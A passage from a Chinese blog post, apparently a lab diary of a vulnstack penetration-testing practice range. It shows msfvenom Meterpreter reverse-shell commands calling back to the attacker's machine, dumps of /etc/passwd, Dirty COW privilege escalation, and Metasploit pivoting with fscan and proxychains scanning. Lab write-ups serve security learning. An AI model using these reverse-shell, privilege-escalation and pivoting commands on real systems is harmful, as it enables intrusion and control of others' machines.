+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># kali</span><br>msfvenom -p linux/x86/meterpreter_reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.1.28 <span class="hljs-attribute">lport</span>=4444 -f elf &gt; shell.elf<br><br><span class="hljs-comment"># msf</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x86/meterpreter_reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.1.28<br>run<br></code></pre></td></tr></table></figure>
+
+<p>上传后运行失败，尝试直接命令行反弹shell，也失败，经过一番检查，发现网卡信息有些不对劲<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209152756012.png" srcset="/img/loading.gif" lazyload alt="image-20231209152756012"></p>
+<p>只有内网？没有外网网卡，所以反弹shell分本到不了我的kali，但这不应该，我的kali明明可以访问到它，它明明有公网ip。。。除非。。。我访问的不是 <code>web</code> 靶机。。。艹！做到这里我是有点焦虑的，就直接用 <code>web</code> 靶机的命令行查找网站根目录，结果根本没有…好吧，看来确实不是同一台机子，应该是做了端口转发之类的，当我访问 <code>web</code> 靶机的80端口的时候，会自动给我转发到另外一台机子…哔了狗了</p>
+<h5 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h5><p>没思路怎么办，继续搜集信息，先看看这台到手的机子(web1)有没有敏感信息</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs elixir">/etc/<span class="hljs-symbol">passwd:</span><br><br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin<br><span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> <span class="hljs-title class_">Bug</span>-<span class="hljs-title class_">Reporting</span> <span class="hljs-title class_">System</span> (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Time</span> <span class="hljs-title class_">Synchronization</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span><br>systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Network</span> <span class="hljs-title class_">Management</span>,,,<span class="hljs-symbol">:/run/systemd/netif</span><span class="hljs-symbol">:/bin/false</span><br>systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Resolver</span>,,,<span class="hljs-symbol">:/run/systemd/resolve</span><span class="hljs-symbol">:/bin/false</span><br>systemd-bus-<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:systemd</span> <span class="hljs-title class_">Bus</span> <span class="hljs-title class_">Proxy</span>,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">108</span>::/home/<span class="hljs-symbol">syslog:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/<span class="hljs-symbol">nonexistent:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">lxd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/var/lib/lxd/<span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">111</span>::/var/run/<span class="hljs-symbol">dbus:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span>::/run/<span class="hljs-symbol">uuidd:</span>/bin/<span class="hljs-literal">false</span><br><span class="hljs-symbol">dnsmasq:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:dnsmasq</span>,,,<span class="hljs-symbol">:/var/lib/misc</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">yy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:yy</span>,,,<span class="hljs-symbol">:/home/yy</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span>::/var/run/<span class="hljs-symbol">sshd:</span>/usr/sbin/nologin<br><span class="hljs-symbol">mysql:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">117</span><span class="hljs-symbol">:MySQL</span> <span class="hljs-title class_">Server</span>,,,<span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/bin/false</span><br><span class="hljs-symbol">www:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span>::/home/<span class="hljs-symbol">www:</span>/sbin/nologin<br><br><br>/etc/mysql/mysql.conf.d/<span class="hljs-symbol">mysqld.cnf:</span><br><br>[mysqld_safe]<br>socket		= /var/run/mysqld/mysqld.sock<br>nice		= <span class="hljs-number">0</span><br><br>[mysqld]<br>user		= mysql<br>pid-file	= /var/run/mysqld/mysqld.pid<br>socket		= /var/run/mysqld/mysqld.sock<br>port		= <span class="hljs-number">3306</span><br>basedir		= /usr<br>datadir		= /var/lib/mysql<br>tmpdir		= /tmp<br>lc-messages-dir	= /usr/share/mysql<br>log_error = /var/log/mysql/error.log<br><br><br>/usr/share/mysql/<span class="hljs-symbol">debian_create_root_user.sql:</span><br><br><span class="hljs-title class_">INSERT</span> <span class="hljs-title class_">INTO</span> tmp_user <span class="hljs-title class_">VALUES</span> (<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>实在找不到有用的信息了，去看攻略发现 <code>/tmp</code> 目录下有个 <code>mysql</code> 文件夹… 我没有啊！我没有！！</p>
+<p>假装我有吧，反正前面也找过这个地方，假装找到的账号密码 <code>wwwuser/wwwuser_123Aqx</code> 好耶(好个屁)</p>
+<p>直接ssh连接 <code>WEB</code> 靶机<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209161456340.png" srcset="/img/loading.gif" lazyload alt="image-20231209161456340"></p>
+<h5 id="提权WEB"><a href="#提权WEB" class="headerlink" title="提权WEB"></a>提权WEB</h5><p>这次没错了，<code>ip a</code> 查看网卡，确实是 <code>WEB</code> 靶机，cat一下 <code>/etc/nginx/nginx.conf</code>，果然做了转发，老贼<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209161756516.png" srcset="/img/loading.gif" lazyload alt="image-20231209161756516"></p>
+<p>反弹shell到msf，上传一个 <code>linpeas</code> ，查看提权信息<img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209171110248.png" srcset="/img/loading.gif" lazyload alt="image-20231209171110248"></p>
+<p>sudo无法执行，suid也没有可用，尝试用脏牛内核提权</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># kali</span><br>searchsploit -m <span class="hljs-number">40611</span><br>gcc -pthread <span class="hljs-number">40611.</span>c<br>将生成的a.<span class="hljs-keyword">out</span>上传到靶机并运行时发现glibc版本不对，静态编译重新上传：<br>gcc -pthread <span class="hljs-number">40839.</span>c -lcrypt --<span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure>
+
+<p>提权成功，新建了一个 <code>firefart</code> 用户，替代了root</p>
+<h3 id="内网-1"><a href="#内网-1" class="headerlink" title="内网"></a>内网</h3><p>现在拿到了 <code>WEB</code> 的root权限和 <code>WEB1</code> 的临时用户权限，上传一个fscan进行内网扫描</p>
+<h4 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span> -h <span class="hljs-number">192.168.93.1</span>-<span class="hljs-number">255</span> -br <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-3/image-20231209194319511.png" srcset="/img/loading.gif" lazyload alt="image-20231209194319511"></p>
+<p>新发现了三个ip：10，20，30，三个ip均开放了 <code>135,139，445</code> 且 10 开放 88 端口，20 开放 1433 端口</p>
+<p>在msf上添加一个路由并添加代理，将nmap带入内网(也可以上传nmap到 WEB 服务器，毕竟已经是我的玩物了)</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata"># msf <span class="hljs-keyword">shell</span>-&gt;meterpreter_shell<br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/manager/shell_to_meterpreter<br><br># meterpreter 添加路由<br><span class="hljs-keyword">run</span> autoroute -s 192.168.93.0/24<br><br><span class="hljs-keyword">use</span> auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> srvhost 127.0.0.1<br>修改 /etc/proxychains.<span class="hljs-keyword">conf</span><br><br># kali<br>proxychains nmap -Pn -<span class="hljs-keyword">sT</span> 192.168.93.10    # Pn 不执行ping操作  <span class="hljs-keyword">sT</span>完整的三次握手<br></code></pre></td></tr></table></figure>
+
+<p>这里不清楚什么原因，反正我的nmap带进内网后也扫不到东西，给<code>WEB</code>上传一个nmap,nmap安装需要python3.x，所以我们又给他装了个python</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/" class="print-no-link">#解题记录</a>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0/" class="print-no-link">#学习</a>
+      
+        <a href="/tags/vulnstack/" class="print-no-link">#vulnstack</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulnstack靶场日记-3</div>
+      <div>https://just1greed.github.io/2023/12/06/vulnstack靶场日记-3/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Greed</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月6日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月10日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/04/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-2/" title="vulnstack靶场日记-2">
+                        <span class="hidden-mobile">vulnstack靶场日记-2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://cdn.staticfile.org/waline/2.15.5/waline.min.css')
+      Fluid.utils.createScript('https://cdn.staticfile.org/waline/2.15.5/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://comment.just1greed.online","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
